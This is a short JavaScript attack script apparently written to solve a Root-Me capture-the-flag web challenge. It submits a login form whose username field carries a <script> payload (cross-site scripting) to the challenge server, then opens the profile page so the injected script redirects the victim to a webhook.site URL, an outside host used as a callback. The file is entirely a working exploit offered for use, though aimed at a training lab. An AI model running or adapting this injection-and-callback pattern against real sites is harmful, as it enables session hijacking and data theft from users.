const ORIGIN = "https://tim-xd.github.io/web-client/index.html";
const LOGIN = "http://challenge01.root-me.org:58003/login";
const PROFILE = "http://challenge01.root-me.org:58003/profile";
const WEBHOOK = "https://webhook.site/5336092a-c1f7-4256-9027-9b8521dbb285";
const OPEN = "rootme";

function get(url) {
  let xhr = new XMLHttpRequest();
  xhr.open("GET", url, false);
  return xhr.send(null);
}

function post(url, data) {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", url, false);
  return xhr.send(data);
}

function openProfile() {
  document.location = PROFILE;
}

window.open(PROFILE, OPEN);

const payload = `
document.location = "${WEBHOOK}?open";
`;
document.getElementById("username").value = `<script>${payload}</script>`;
document.getElementById("login").action = LOGIN;
document.getElementById("login").submit();

setTimeout(() => openProfile(), 2000);
